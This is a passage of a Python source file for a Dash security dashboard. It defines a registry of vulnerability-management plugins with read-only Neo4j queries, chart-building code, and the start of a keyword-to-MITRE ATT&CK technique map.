# ==============================================================================
# ui_plugins.py — Security Plugin Hub (30 Plugins, Registry-Driven)
# ==============================================================================
"""
Unified plugin system for the security dashboard. Each plugin is a registry
entry with metadata, features, and a Neo4j query for live data. The hub
renders as a categorized card grid; clicking a card opens its detail view.
"""

import os, json, time
import pandas as pd
import plotly.express as px
import plotly.graph_objects as go
from dash import html, dcc, callback, Input, Output, State, no_update, callback_context, ALL
import dash_bootstrap_components as dbc
import dash

# ==============================================================================
# PLUGIN REGISTRY
# ==============================================================================

PLUGIN_REGISTRY = {
    # ── RISK INTELLIGENCE ────────────────────────────────────────────────────
    "aegis": {
        "name": "Aegis",
        "icon": "🛡️",
        "category": "Risk Intelligence",
        "cat_color": "#ff6b35",
        "description": "Risk intelligence and security decision engine.",
        "features": [
            "Prioritizes vulnerabilities by risk score",
            "Calculates composite risk scores",
            "Maps CVEs to MITRE ATT&CK techniques",
            "Checks CISA KEV catalog integration",
            "Generates attack path analysis",
            "Provides remediation guidance",
        ],
        "neo4j_query": """
            MATCH (f:Finding) WHERE f.cve IS NOT NULL
            WITH f, toFloat(coalesce(toString(f.cvss),'0')) AS cvss_score
            RETURN f.cve AS cve, cvss_score AS cvss,
                   CASE WHEN cvss_score >= 9.0 THEN 'CRITICAL'
                        WHEN cvss_score >= 7.0 THEN 'HIGH'
                        WHEN cvss_score >= 4.0 THEN 'MEDIUM'
                        ELSE 'LOW' END AS risk_level,
                   coalesce(f.host,'—') AS host,
                   f.exploitable AS exploitable
            ORDER BY cvss_score DESC LIMIT 15
        """,
        "status": "active",
    },
    "exploitiq": {
        "name": "ExploitIQ",
        "icon": "💥",
        "category": "Risk Intelligence",
        "cat_color": "#ff6b35",
        "description": "Exploit verification engine.",
        "features": [
            "Checks if vulnerabilities are exploitable",
            "Pulls PoC exploits from exploit databases",
            "Tests safe exploit validation",
            "Marks findings as: Verified / Theoretical / False Positive",
        ],
        "neo4j_query": """
            MATCH (f:Finding) WHERE f.cve IS NOT NULL
            RETURN f.cve AS cve, f.exploitable AS exploitable,
                   toFloat(coalesce(toString(f.cvss),'0')) AS cvss,
                   coalesce(f.source,'unknown') AS source,
                   coalesce(f.host,'—') AS host
            ORDER BY toFloat(coalesce(toString(f.cvss),'0')) DESC LIMIT 15
        """,
        "status": "active",
    },
    "threatintel": {
        "name": "ThreatIntel",
        "icon": "📡",
        "category": "Risk Intelligence",
        "cat_color": "#ff6b35",
        "description": "Threat intelligence integration.",
        "features": [
            "Checks vulnerabilities against threat feeds",
            "Detects active exploitation campaigns",
            "Tracks ransomware groups",
            "Integrates with CVE feeds",
        ],
        "neo4j_query": """
            MATCH (f:Finding) WHERE f.cve IS NOT NULL AND (f.in_kev = true OR f.exploitable = true)
            RETURN f.cve AS cve, f.in_kev AS in_kev, f.exploitable AS exploitable,
                   toFloat(coalesce(toString(f.cvss),'0')) AS cvss,
                   coalesce(f.source,'unknown') AS source
            ORDER BY toFloat(coalesce(toString(f.cvss),'0')) DESC LIMIT 15
        """,
        "status": "active",
    },
    "threatactoriq": {
        "name": "ThreatActorIQ",
        "icon": "🎭",
        "category": "Risk Intelligence",
        "cat_color": "#ff6b35",
        "description": "Threat actor attribution.",
        "features": [
            "Maps vulnerabilities to known attackers",
            "Associates attack techniques with APT groups",
            "Provides threat context and adversary profiles",
        ],
        "neo4j_query": """
            MATCH (f:Finding)-[:MAPS_TO]->(t:AttackTechnique)
            WHERE f.cve IS NOT NULL
            RETURN f.cve AS cve, t.id AS technique_id, t.name AS technique_name,
                   t.tactic AS tactic, toFloat(coalesce(toString(f.cvss),'0')) AS cvss
            ORDER BY toFloat(coalesce(toString(f.cvss),'0')) DESC LIMIT 15
        """,
        "status": "active",
    },

    # ── ATTACK SIMULATION ────────────────────────────────────────────────────
    "attackgraph": {
        "name": "AttackGraph",
        "icon": "🕸️",
        "category": "Attack Simulation",
        "cat_color": "#e63946",
        "description": "Attack path visualization.",
        "features": [
            "Builds attack chains between hosts",
            "Maps lateral movement opportunities",
            "Generates visual attack graphs",
            "Example: Internet → Web Server → Credentials → DC",
        ],
        "neo4j_query": """
            MATCH (h)-[*1..2]-(f:Finding)
            WHERE any(l IN labels(h) WHERE l IN ['Host','Asset']) AND f.cve IS NOT NULL
            RETURN h.host AS host, f.cve AS cve, f.severity AS severity,
                   f.name AS vuln_name,
                   toFloat(coalesce(toString(f.cvss),'0')) AS cvss
            ORDER BY cvss DESC LIMIT 20
        """,
        "status": "active",
    },
    "breachsim": {
        "name": "BreachSim",
        "icon": "🔓",
        "category": "Attack Simulation",
        "cat_color": "#e63946",
        "description": "Simulated breach testing.",
        "features": [
            "Simulates attacker behavior",
            "Tests exploitation chains",
            "Calculates breach likelihood",
        ],
        "neo4j_query": """
            MATCH (f:Finding) WHERE f.cve IS NOT NULL AND f.exploitable = true
            RETURN f.cve AS cve, toFloat(coalesce(toString(f.cvss),'0')) AS cvss,
                   coalesce(f.host,'—') AS host, f.severity AS severity
            ORDER BY toFloat(coalesce(toString(f.cvss),'0')) DESC LIMIT 15
        """,
        "status": "active",
    },
    "pivotsim": {
        "name": "PivotSim",
        "icon": "🔀",
        "category": "Attack Simulation",
        "cat_color": "#e63946",
        "description": "Lateral movement simulation.",
        "features": [
            "Detects pivot opportunities",
            "Identifies network traversal paths",
            "Maps internal compromise routes",
        ],
        "neo4j_query": """
            MATCH (h)-[*1..2]-(f:Finding)
            WHERE any(l IN labels(h) WHERE l IN ['Host','Asset']) AND f.cve IS NOT NULL
            WITH h.host AS host, collect(DISTINCT f.cve) AS cves, count(f) AS vuln_count
            RETURN host, cves[0..5] AS top_cves, vuln_count
            ORDER BY vuln_count DESC LIMIT 15
        """,
        "status": "active",
    },
    "privescpath": {
        "name": "PrivEscPath",
        "icon": "⬆️",
        "category": "Attack Simulation",
        "cat_color": "#e63946",
        "description": "Privilege escalation detection.",
        "features": [
            "Finds local privilege escalation vulnerabilities",
            "Maps escalation chains",
            "Example: User → sudo misconfiguration → root",
        ],
        "neo4j_query": """
            MATCH (f:Finding) WHERE f.cve IS NOT NULL
            AND (toLower(f.name) CONTAINS 'privilege' OR toLower(f.name) CONTAINS 'escalation'
                 OR toLower(f.name) CONTAINS 'sudo' OR toLower(f.name) CONTAINS 'root')
            RETURN f.cve AS cve, f.name AS vuln_name,
                   toFloat(coalesce(toString(f.cvss),'0')) AS cvss,
                   coalesce(f.host,'—') AS host
            ORDER BY toFloat(coalesce(toString(f.cvss),'0')) DESC LIMIT 15
        """,
        "status": "active",
    },

    # ── INFRASTRUCTURE SECURITY ──────────────────────────────────────────────
    "exposureguard": {
        "name": "ExposureGuard",
        "icon": "🌐",
        "category": "Infrastructure Security",
        "cat_color": "#457b9d",
        "description": "External exposure analysis.",
        "features": [
            "Detects publicly exposed services",
            "Evaluates internet attack surface",
            "Identifies risky ports and protocols",
        ],
        "neo4j_query": """
            MATCH (h)-[*1..2]-(f:Finding)
            WHERE any(l IN labels(h) WHERE l IN ['Host','Asset']) AND f.cve IS NOT NULL
            RETURN h.host AS host, count(f) AS finding_count,
                   max(toFloat(coalesce(toString(f.cvss),'0'))) AS max_cvss
            ORDER BY max_cvss DESC LIMIT 15
        """,
        "status": "active",
    },
    "segmentiq": {
        "name": "SegmentIQ",
        "icon": "🧱",
        "category": "Infrastructure Security",
        "cat_color": "#457b9d",
        "description": "Network segmentation analysis.",
        "features": [
            "Detects segmentation weaknesses",
            "Identifies cross-network access",
            "Evaluates trust boundaries",
        ],
        "neo4j_query": """
            MATCH (h)-[*1..2]-(f:Finding)
            WHERE any(l IN labels(h) WHERE l IN ['Host','Asset']) AND f.cve IS NOT NULL
            WITH h.host AS host, count(f) AS vuln_count,
                 collect(DISTINCT f.severity) AS severities
            RETURN host, vuln_count, severities
            ORDER BY vuln_count DESC LIMIT 15
        """,
        "status": "active",
    },
    "trustgraph": {
        "name": "TrustGraph",
        "icon": "🔗",
        "category": "Infrastructure Security",
        "cat_color": "#457b9d",
        "description": "Active Directory trust mapping.",
        "features": [
            "Maps domain trust relationships",
            "Detects dangerous AD trust paths",
            "Identifies domain escalation risks",
        ],
        "neo4j_query": """
            MATCH (f:Finding) WHERE f.cve IS NOT NULL
            AND (toLower(f.name) CONTAINS 'active directory' OR toLower(f.name) CONTAINS 'ldap'
                 OR toLower(f.name) CONTAINS 'kerberos' OR toLower(f.name) CONTAINS 'smb')
            RETURN f.cve AS cve, f.name AS vuln_name,
                   toFloat(coalesce(toString(f.cvss),'0')) AS cvss,
                   coalesce(f.host,'—') AS host
            ORDER BY toFloat(coalesce(toString(f.cvss),'0')) DESC LIMIT 15
        """,
        "status": "active",
    },
    "shadowmap": {
        "name": "ShadowMap",
        "icon": "👤",
        "category": "Infrastructure Security",
        "cat_color": "#457b9d",
        "description": "Shadow IT discovery.",
        "features": [
            "Finds unmanaged cloud assets",
            "Detects unknown infrastructure",
            "Maps external assets",
        ],
        "neo4j_query": """
            MATCH (h)
            WHERE any(l IN labels(h) WHERE l IN ['Host','Asset'])
            OPTIONAL MATCH (h)-[*1..2]-(f:Finding)
            RETURN h.host AS host, count(f) AS finding_count
            ORDER BY finding_count DESC LIMIT 20
        """,
        "status": "active",
    },

    # ── CLOUD SECURITY ───────────────────────────────────────────────────────
    "cloudguard": {
        "name": "CloudGuard",
        "icon": "☁️",
        "category": "Cloud Security",
        "cat_color": "#2ec4b6",
        "description": "Cloud misconfiguration scanning.",
        "features": [
            "Scans AWS, Azure, and GCP",
            "Detects insecure cloud settings",
            "Identifies exposed storage buckets",
        ],
        "neo4j_query": """
            MATCH (f:Finding) WHERE f.cve IS NOT NULL
            AND (toLower(f.name) CONTAINS 'cloud' OR toLower(f.name) CONTAINS 'aws'
                 OR toLower(f.name) CONTAINS 'azure' OR toLower(f.name) CONTAINS 'gcp'
                 OR toLower(f.name) CONTAINS 's3')
            RETURN f.cve AS cve, f.name AS vuln_name,
                   toFloat(coalesce(toString(f.cvss),'0')) AS cvss
            ORDER BY cvss DESC LIMIT 15
        """,
        "status": "active",
    },
    "cloudescalator": {
        "name": "CloudEscalator",
        "icon": "🪜",
        "category": "Cloud Security",
        "cat_color": "#2ec4b6",
        "description": "Cloud privilege escalation detection.",
        "features": [
            "Identifies IAM privilege escalation",
            "Detects risky permissions",
        ],
        "neo4j_query": """
            MATCH (f:Finding) WHERE f.cve IS NOT NULL
            AND (toLower(f.name) CONTAINS 'iam' OR toLower(f.name) CONTAINS 'privilege'
                 OR toLower(f.name) CONTAINS 'permission')
            RETURN f.cve AS cve, f.name AS vuln_name,
                   toFloat(coalesce(toString(f.cvss),'0')) AS cvss
            ORDER BY cvss DESC LIMIT 15
        """,
        "status": "active",
    },
    "containersentinel": {
        "name": "ContainerSentinel",
        "icon": "🐳",
        "category": "Cloud Security",
        "cat_color": "#2ec4b6",
        "description": "Container vulnerability scanning.",
        "features": [
            "Scans Docker images",
            "Identifies container CVEs",
            "Detects vulnerable dependencies",
        ],
        "neo4j_query": """
            MATCH (f:Finding) WHERE f.cve IS NOT NULL
            AND (toLower(f.name) CONTAINS 'docker' OR toLower(f.name) CONTAINS 'container'
                 OR toLower(f.name) CONTAINS 'kubernetes' OR toLower(f.name) CONTAINS 'k8s')
            RETURN f.cve AS cve, f.name AS vuln_name,
                   toFloat(coalesce(toString(f.cvss),'0')) AS cvss
            ORDER BY cvss DESC LIMIT 15
        """,
        "status": "active",
    },
    "kubehunter": {
        "name": "KubeHunter+",
        "icon": "⚙️",
        "category": "Cloud Security",
        "cat_color": "#2ec4b6",
        "description": "Kubernetes security scanning.",
        "features": [
            "Detects exposed Kubernetes components",
            "Finds cluster misconfigurations",
            "Identifies API server vulnerabilities",
        ],
        "neo4j_query": """
            MATCH (f:Finding) WHERE f.cve IS NOT NULL
            AND (toLower(f.name) CONTAINS 'kubernetes' OR toLower(f.name) CONTAINS 'k8s'
                 OR toLower(f.name) CONTAINS 'kube' OR toLower(f.name) CONTAINS 'etcd')
            RETURN f.cve AS cve, f.name AS vuln_name,
                   toFloat(coalesce(toString(f.cvss),'0')) AS cvss
            ORDER BY cvss DESC LIMIT 15
        """,
        "status": "active",
    },

    # ── WEB & API SECURITY ───────────────────────────────────────────────────
    "apiguardian": {
        "name": "API Guardian",
        "icon": "🔌",
        "category": "Web & API Security",
        "cat_color": "#a855f7",
        "description": "API vulnerability scanner.",
        "features": [
            "Scans REST APIs",
            "Detects API vulnerabilities",
            "Tests authentication and authorization flaws",
        ],
        "neo4j_query": """
            MATCH (f:Finding) WHERE f.cve IS NOT NULL
            AND (toLower(f.name) CONTAINS 'api' OR toLower(f.name) CONTAINS 'rest'
                 OR toLower(f.name) CONTAINS 'auth' OR toLower(f.name) CONTAINS 'oauth')
            RETURN f.cve AS cve, f.name AS vuln_name,
                   toFloat(coalesce(toString(f.cvss),'0')) AS cvss
            ORDER BY cvss DESC LIMIT 15
        """,
        "status": "active",
    },
    "graphshield": {
        "name": "GraphShield",
        "icon": "🛡️",
        "category": "Web & API Security",
        "cat_color": "#a855f7",
        "description": "GraphQL security scanner.",
        "features": [
            "Detects GraphQL introspection abuse",
            "Tests query complexity attacks",
        ],
        "neo4j_query": """
            MATCH (f:Finding) WHERE f.cve IS NOT NULL
            AND (toLower(f.name) CONTAINS 'graphql' OR toLower(f.name) CONTAINS 'query'
                 OR toLower(f.name) CONTAINS 'injection')
            RETURN f.cve AS cve, f.name AS vuln_name,
                   toFloat(coalesce(toString(f.cvss),'0')) AS cvss
            ORDER BY cvss DESC LIMIT 15
        """,
        "status": "active",
    },
    "authprobe": {
        "name": "AuthProbe",
        "icon": "🔑",
        "category": "Web & API Security",
        "cat_color": "#a855f7",
        "description": "Authentication logic analyzer.",
        "features": [
            "Detects authentication flaws",
            "Tests session security",
            "Identifies logic vulnerabilities",
        ],
        "neo4j_query": """
            MATCH (f:Finding) WHERE f.cve IS NOT NULL
            AND (toLower(f.name) CONTAINS 'auth' OR toLower(f.name) CONTAINS 'session'
                 OR toLower(f.name) CONTAINS 'login' OR toLower(f.name) CONTAINS 'credential')
            RETURN f.cve AS cve, f.name AS vuln_name,
                   toFloat(coalesce(toString(f.cvss),'0')) AS cvss
            ORDER BY cvss DESC LIMIT 15
        """,
        "status": "active",
    },
    "apiabuseguard": {
        "name": "APIAbuseGuard",
        "icon": "🚫",
        "category": "Web & API Security",
        "cat_color": "#a855f7",
        "description": "API abuse detection.",
        "features": [
            "Detects rate-limit bypass",
            "Identifies API abuse scenarios",
        ],
        "neo4j_query": """
            MATCH (f:Finding) WHERE f.cve IS NOT NULL
            AND (toLower(f.name) CONTAINS 'rate' OR toLower(f.name) CONTAINS 'abuse'
                 OR toLower(f.name) CONTAINS 'brute' OR toLower(f.name) CONTAINS 'dos')
            RETURN f.cve AS cve, f.name AS vuln_name,
                   toFloat(coalesce(toString(f.cvss),'0')) AS cvss
            ORDER BY cvss DESC LIMIT 15
        """,
        "status": "active",
    },

    # ── VULNERABILITY INTELLIGENCE ───────────────────────────────────────────
    "kevwatch": {
        "name": "KEVWatch",
        "icon": "👁️",
        "category": "Vulnerability Intelligence",
        "cat_color": "#f72585",
        "description": "CISA KEV vulnerability tracking.",
        "features": [
            "Detects vulnerabilities in CISA KEV catalog",
            "Flags actively exploited vulnerabilities",
            "Prioritizes critical threats",
        ],
        "neo4j_query": """
            MATCH (f:Finding)-[:IN_KEV]->(k:KEV)
            WHERE f.cve IS NOT NULL
            RETURN f.cve AS cve, k.vulnerability_name AS kev_name,
                   k.date_added AS kev_date, k.catalog_id AS catalog_id,
                   toFloat(coalesce(toString(f.cvss),'0')) AS cvss
            ORDER BY cvss DESC LIMIT 15
        """,
        "status": "active",
    },
    "cveradar": {
        "name": "CVE Radar",
        "icon": "📡",
        "category": "Vulnerability Intelligence",
        "cat_color": "#f72585",
        "description": "Real-time vulnerability intelligence.",
        "features": [
            "Monitors new CVEs",
            "Tracks newly disclosed vulnerabilities",
            "Alerts on emerging threats",
        ],
        "neo4j_query": """
            MATCH (f:Finding) WHERE f.cve IS NOT NULL
            RETURN f.cve AS cve, f.name AS vuln_name,
                   toFloat(coalesce(toString(f.cvss),'0')) AS cvss,
                   coalesce(f.source,'unknown') AS source,
                   coalesce(f.severity,'—') AS severity
            ORDER BY cvss DESC LIMIT 20
        """,
        "status": "active",
    },
    "ransomguard": {
        "name": "RansomGuard",
        "icon": "🔒",
        "category": "Vulnerability Intelligence",
        "cat_color": "#f72585",
        "description": "Ransomware exposure detection.",
        "features": [
            "Detects vulnerabilities commonly used by ransomware",
            "Identifies risky systems",
        ],
        "neo4j_query": """
            MATCH (f:Finding) WHERE f.cve IS NOT NULL AND f.exploitable = true
            AND toFloat(coalesce(toString(f.cvss),'0')) >= 7.0
            RETURN f.cve AS cve, f.name AS vuln_name,
                   toFloat(coalesce(toString(f.cvss),'0')) AS cvss,
                   coalesce(f.host,'—') AS host
            ORDER BY cvss DESC LIMIT 15
        """,
        "status": "active",
    },

    # ── ASSET INTELLIGENCE ───────────────────────────────────────────────────
    "assetmap": {
        "name": "AssetMap",
        "icon": "🗺️",
        "category": "Asset Intelligence",
        "cat_color": "#06d6a0",
        "description": "Asset discovery and mapping.",
        "features": [
            "Detects hosts",
            "Maps IP ranges",
            "Identifies network assets",
        ],
        "neo4j_query": """
            MATCH (h)
            WHERE any(l IN labels(h) WHERE l IN ['Host','Asset'])
            OPTIONAL MATCH (h)-[*1..2]-(f:Finding)
            WITH h.host AS host, count(f) AS finding_count,
                 max(toFloat(coalesce(toString(f.cvss),'0'))) AS max_cvss
            RETURN host, finding_count, max_cvss
            ORDER BY finding_count DESC LIMIT 20
        """,
        "status": "active",
    },
    "surfacescan": {
        "name": "SurfaceScan",
        "icon": "🔍",
        "category": "Asset Intelligence",
        "cat_color": "#06d6a0",
        "description": "Attack surface discovery.",
        "features": [
            "Identifies internet-facing assets",
            "Detects exposed services",
            "Maps public infrastructure",
        ],
        "neo4j_query": """
            MATCH (h)-[*1..2]-(f:Finding)
            WHERE any(l IN labels(h) WHERE l IN ['Host','Asset']) AND f.cve IS NOT NULL
            WITH h.host AS host, count(DISTINCT f.cve) AS cve_count,
                 max(toFloat(coalesce(toString(f.cvss),'0'))) AS max_cvss
            RETURN host, cve_count, max_cvss
            ORDER BY cve_count DESC LIMIT 20
        """,
        "status": "active",
    },
    "reconeye": {
        "name": "ReconEye",
        "icon": "🔭",
        "category": "Asset Intelligence",
        "cat_color": "#06d6a0",
        "description": "Reconnaissance automation.",
        "features": [
            "DNS enumeration",
            "Subdomain discovery",
            "ASN mapping",
        ],
        "neo4j_query": """
            MATCH (h)
            WHERE any(l IN labels(h) WHERE l IN ['Host','Asset'])
            RETURN h.host AS host, labels(h) AS labels
            ORDER BY h.host LIMIT 20
        """,
        "status": "active",
    },

    # ── REMEDIATION ──────────────────────────────────────────────────────────
    "patchguard": {
        "name": "PatchGuard",
        "icon": "🩹",
        "category": "Remediation",
        "cat_color": "#ffd166",
        "description": "Patch management analysis.",
        "features": [
            "Detects missing patches",
            "Evaluates patch compliance",
            "Prioritizes updates by risk",
        ],
        "neo4j_query": """
            MATCH (f:Finding) WHERE f.cve IS NOT NULL
            RETURN f.cve AS cve, f.name AS vuln_name,
                   toFloat(coalesce(toString(f.cvss),'0')) AS cvss,
                   coalesce(f.host,'—') AS host,
                   coalesce(f.severity,'—') AS severity,
                   f.exploitable AS exploitable
            ORDER BY toFloat(coalesce(toString(f.cvss),'0')) DESC LIMIT 20
        """,
        "status": "active",
    },
}


# ==============================================================================
# CATEGORY ORDERING & COLORS
# ==============================================================================
CATEGORY_ORDER = [
    "Risk Intelligence",
    "Attack Simulation",
    "Infrastructure Security",
    "Cloud Security",
    "Web & API Security",
    "Vulnerability Intelligence",
    "Asset Intelligence",
    "Remediation",
]

CATEGORY_ICONS = {
    "Risk Intelligence": "🎯",
    "Attack Simulation": "⚔️",
    "Infrastructure Security": "🏗️",
    "Cloud Security": "☁️",
    "Web & API Security": "🌐",
    "Vulnerability Intelligence": "🔍",
    "Asset Intelligence": "📊",
    "Remediation": "🩹",
}


# ==============================================================================
# PLUGIN CARD BUILDER
# ==============================================================================
def _build_plugin_card(pid, plugin):
    """Build a single plugin card for the hub grid."""
    return dbc.Col(
        dbc.Card([
            dbc.CardBody([
                html.Div([
                    html.Span(plugin["icon"], style={"fontSize": "28px", "marginRight": "10px"}),
                    html.Span(plugin["name"], style={
                        "fontSize": "16px", "fontWeight": "700", "color": "#fff",
                    }),
                ], style={"display": "flex", "alignItems": "center", "marginBottom": "8px"}),

                html.P(plugin["description"],
                       style={"fontSize": "11px", "color": "#aaa", "marginBottom": "10px",
                              "lineHeight": "1.4"}),

                html.Div([
                    dbc.Badge(f, color="dark",
                              style={"fontSize": "9px", "marginRight": "4px", "marginBottom": "3px",
                                     "border": f"1px solid {plugin['cat_color']}33"})
                    for f in plugin["features"][:3]
                ], style={"marginBottom": "10px"}),

                # Use dbc.Button with MATCH pattern ID — no href hash routing needed
                dbc.Button(
                    "Open Plugin ▸",
                    id={"type": "plugin-open-btn", "index": pid},
                    n_clicks=0,
                    style={
                        "display": "block",
                        "width": "100%",
                        "textAlign": "center",
                        "padding": "6px 0",
                        "fontSize": "11px",
                        "fontWeight": "bold",
                        "color": plugin["cat_color"],
                        "backgroundColor": "transparent",
                        "border": f"1px solid {plugin['cat_color']}",
                        "borderRadius": "4px",
                        "cursor": "pointer",
                    }
                ),
            ]),
        ], style={
            "backgroundColor": "#111118",
            "border": f"1px solid {plugin['cat_color']}33",
            "borderRadius": "10px",
            "transition": "all 0.2s ease",
            "cursor": "pointer",
        }, className="plugin-card h-100"),
        md=3, className="mb-3",
    )


# ==============================================================================
# DYNAMIC GRAPH ENGINE
# ==============================================================================

def _build_plugin_charts(data_rows, plugin):
    """Automatically generate Plotly charts from Neo4j data rows based on column types."""
    if not data_rows:
        return None

    df = pd.DataFrame(data_rows)
    cols = list(df.columns)
    charts = []
    cat_color = plugin.get("cat_color", "#ff6b35")

    # Chart 1: Distribution of Severities, Risk Levels, or Boolean states
    donut_col = next((c for c in cols if c in ["severity", "risk_level", "exploitable", "in_kev"]), None)
    if donut_col:
        counts = df[donut_col].value_counts().reset_index()
        counts.columns = [donut_col, "Count"]
        
        # Color mapping logic
        color_discrete_map = {}
        if donut_col in ["severity", "risk_level"]:
            color_discrete_map = {
                "CRITICAL": "#ff0000", "HIGH": "#ff6b35", "MEDIUM": "#ffaa00", "LOW": "#44ff88",
                "Critical": "#ff0000", "High": "#ff6b35", "Medium": "#ffaa00", "Low": "#44ff88"
            }
        elif donut_col in ["exploitable", "in_kev"]:
            color_discrete_map = {True: "#ff0000", False: "#44ff88", "true": "#ff0000", "false": "#44ff88"}

        fig = px.pie(
            counts, names=donut_col, values="Count", hole=0.65,
            color=donut_col, color_discrete_map=color_discrete_map,
            color_discrete_sequence=px.colors.sequential.Plasma
        )
        fig.update_layout(
            template="plotly_dark", paper_bgcolor="rgba(0,0,0,0)", plot_bgcolor="rgba(0,0,0,0)",
            margin=dict(l=20, r=20, t=40, b=20),
            title=dict(text=f"Distribution by {donut_col.replace('_',' ').title()}", font=dict(size=13, color="#ccc"), x=0.5),
            showlegend=True, legend=dict(orientation="h", y=-0.2, x=0.5, xanchor="center"),
            height=280
        )
        charts.append(dbc.Col(dcc.Graph(figure=fig, config={"displayModeBar": False}), md=6))

    # Chart 2: Top Items by Score or Count (Bar Chart)
    score_col = next((c for c in cols if c in ["cvss", "max_cvss"]), None)
    count_col = next((c for c in cols if c in ["finding_count", "vuln_count", "cve_count"]), None)
    
    label_col = next((c for c in cols if c in ["cve", "host", "technique_name", "vuln_name", "kev_name"]), None)

    if label_col and (score_col or count_col):
        val_col = score_col if score_col else count_col
        # Sort and take top 10
        df_sorted = df.sort_values(by=val_col, ascending=True).tail(10) # ascending so largest is at top of horiz bar
        
        fig = px.bar(
            df_sorted, y=label_col, x=val_col, orientation="h",
            color=val_col, color_continuous_scale=["#1a1a2e", cat_color]
        )
        # Simplify display
        fig.update_yaxes(title="", tickfont=dict(size=9))
        fig.update_xaxes(title=val_col.replace('_', ' ').upper(), gridcolor="#333", gridwidth=1)
        fig.update_layout(
            template="plotly_dark", paper_bgcolor="rgba(0,0,0,0)", plot_bgcolor="rgba(0,0,0,0)",
            margin=dict(l=20, r=20, t=40, b=20),
            title=dict(text=f"Top {label_col.replace('_',' ').title()} by {val_col.replace('_',' ').title()}", font=dict(size=13, color="#ccc"), x=0.5),
            coloraxis_showscale=False,
            height=280
        )
        charts.append(dbc.Col(dcc.Graph(figure=fig, config={"displayModeBar": False}), md=6 if donut_col else 12))

    # If no chart could be inferred, fall back to a simple distribution if there's any categorical data
    if not charts and label_col and len(df) > 1:
         # Just show top elements by frequency in the queries that don't have explicit count columns
         # e.g a query returning many rows for the same host
         counts = df[label_col].value_counts().reset_index().head(10)
         counts.columns = [label_col, "Count"]
         counts = counts.sort_values("Count", ascending=True)
         fig = px.bar(
             counts, y=label_col, x="Count", orientation="h",
             color_discrete_sequence=[cat_color]
         )
         fig.update_yaxes(title="", tickfont=dict(size=9))
         fig.update_layout(
             template="plotly_dark", paper_bgcolor="rgba(0,0,0,0)", plot_bgcolor="rgba(0,0,0,0)",
             margin=dict(l=20, r=20, t=40, b=20),
             title=dict(text=f"Most Frequent {label_col.replace('_',' ').title()}", font=dict(size=13, color="#ccc"), x=0.5),
             height=280
         )
         charts.append(dbc.Col(dcc.Graph(figure=fig, config={"displayModeBar": False}), md=12))

    if charts:
        return dbc.Row(charts, className="mt-3 mb-3")
    return None


# ==============================================================================
# INTELLIGENCE HELPER FUNCTIONS
# ==============================================================================
import subprocess, json as _json, re as _re

# ── MITRE ATT&CK keyword map ─────────────────────────────────────────────────
_MITRE_MAP = {
    # keyword → [(tactic, technique_id, technique_name, procedure_summary)]
    "exploit": [
        ("Execution",         "T1203", "Exploitation for Client Execution",   "Adversary uses a software vulnerability to execute code in a client app."),
        ("Privilege Escalation","T1068","Exploitation for Privilege Escalation","Exploiting a bug or vulnerability to gain higher-level permissions."),
        ("Initial Access",    "T1190", "Exploit Public-Facing Application",   "Exploiting weakness in internet-facing service to gain initial access."),
    ],
    "network": [
        ("Discovery",         "T1046", "Network Service Discovery",           "Enumerate services running on remote hosts using port scanning."),
        ("Lateral Movement",  "T1021", "Remote Services",                     "Use valid accounts to log into remote services and execute actions."),
        ("Collection",        "T1040", "Network Sniffing",                    "Capture network traffic to obtain credentials or sensitive data."),
    ],
    "credential": [
        ("Credential Access", "T1110", "Brute Force",                         "Try many passwords to guess valid credentials."),
        ("Credential Access", "T1003", "OS Credential Dumping",               "Dump credentials from OS or software to obtain account login info."),
        ("Defense Evasion",   "T1550", "Use Alternate Authentication Material","Use alternate authentication material such as hashes, tokens, or keys."),
    ],
    "web": [
        ("Initial Access",    "T1190", "Exploit Public-Facing Application",   "Exploit weakness in internet-facing application."),
        ("Collection",        "T1113", "Screen Capture",                      "Adversaries may attempt to take screen captures."),
        ("Exfiltration",      "T1041", "Exfiltration Over C2 Channel",        "Steal data by transmitting it through command and control channel."),
    ],
    "ransomware": [
        ("Impact",            "T1486", "Data Encrypted for Impact",           "Encrypt data on target to interrupt availability."),
        ("Persistence",       "T1547", "Boot or Logon Autostart Execution",   "Configure auto-execute on boot for persistence."),
        ("Lateral Movement",  "T1570", "Lateral Tool Transfer",               "Copy tools or files from one host to another within the network."),
    ],
    "cloud": [
        ("Defense Evasion",   "T1578", "Modify Cloud Compute Infrastructure", "Modify cloud infrastructure to evade defenses."),
        ("Discovery",         "T1580", "Cloud Infrastructure Discovery",      "Enumerate cloud infrastructure to determine resources available."),
        ("Privilege Escalation","T1548","Abuse Elevation Control Mechanism",  "Exploit elevated control mechanisms to escalate privileges."),
    ],
    "auth": [
        ("Credential Access", "T1110", "Brute Force",                         "Gain access through systematic credential guessing."),
        ("Defense Evasion",   "T1556", "Modify Authentication Process",       "Modify authentication mechanisms to access user credentials."),
        ("Persistence",       "T1078", "Valid Accounts",                      "Use legitimate credentials to maintain access."),
    ],
    "recon": [
        ("Reconnaissance",    "T1595", "Active Scanning",                     "Scan victim infrastructure to gather information."),
        ("Reconnaissance",    "T1596", "Search Open Technical Databases",     "Search open databases for technical info about victim."),
        ("Discovery",         "T1018", "Remote System Discovery",             "Identify other systems to pivot to in the network."),
    ],
    "patch": [
        ("Defense Evasion",   "T1562", "Impair Defenses",                     "Disable or modify tools to avoid detection."),
        ("Persistence",       "T1547", "Boot or Logon Autostart Execution",   "Establish persistence by modifying startup programs."),
        ("Initial Access",    "T1190", "Exploit Public-Facing Application",   "Vulnerable unpatched apps become target entry points."),
    ],
    "risk": [
        ("Collection",        "T1213", "Data from Information Repositories",  "Adversaries may collect data from repositories like databases."),
        ("Discovery",         "T1082", "System Information Discovery",        "Gather information about OS and hardware to plan next steps."),
        ("Impact",            "T1485", "Data Destruction",                    "Destroy data to make it unavailable."),
    ],
    "container": [
        ("Execution",         "T1610", "Deploy Container",                    "Deploy new container to execute code in environment."),
        ("Privilege Escalation","T1611","Escape to Host",                     "Break out of container to gain access to host OS."),
        ("Defense Evasion",   "T1612", "Build Image on Host",                 "Build container image on host to execute code."),
    ],
    "kubernetes": [
        ("Execution",         "T1610", "Deploy Container",                    "Create new container within K8s cluster."),
        ("Privilege Escalation","T1611","Escape to Host",                     "Gain host-level access from within K8s pod."),
        ("Discovery",         "T1613", "Container and Resource Discovery",    "Identify containers and resources within K8s environment."),
    ],
    "iam": [
        ("Privilege Escalation","T1548","Abuse Elevation Control Mechanism",  "Exploit IAM permissions to escalate privileges in cloud."),
        ("Defense Evasion",   "T1550", "Use Alternate Authentication Material","Use tokens or keys instead of primary credentials."),
        ("Persistence",       "T1098", "Account Manipulation",               "Manipulate accounts to maintain persistent access."),
    ],
